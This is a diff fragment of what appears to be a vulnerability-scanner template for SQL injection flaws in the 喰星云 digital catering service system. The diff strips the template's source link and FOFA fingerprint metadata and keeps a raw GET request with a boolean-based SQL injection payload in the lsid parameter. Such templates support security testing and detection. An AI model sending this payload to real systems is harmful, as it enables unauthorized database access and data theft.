@@ -3,12 +3,8 @@ info:
   name: 喰星云数字化餐饮服务系统 多处 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/myyc3bgcqxk6nae8'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: myyc3bgcqxk6nae8
-    fofa: body="tmp_md5_pwd"
 http:
 - raw:
   - 'GET /logistics/home_warning/php/not_out_depot.php?do=getList&lsid=(SELECT%20(CASE%20WHEN%20(5630=5631)%20THEN%202%20ELSE%20(SELECT%207330%20UNION%20SELECT%203010)%20END)) HTTP/1.1
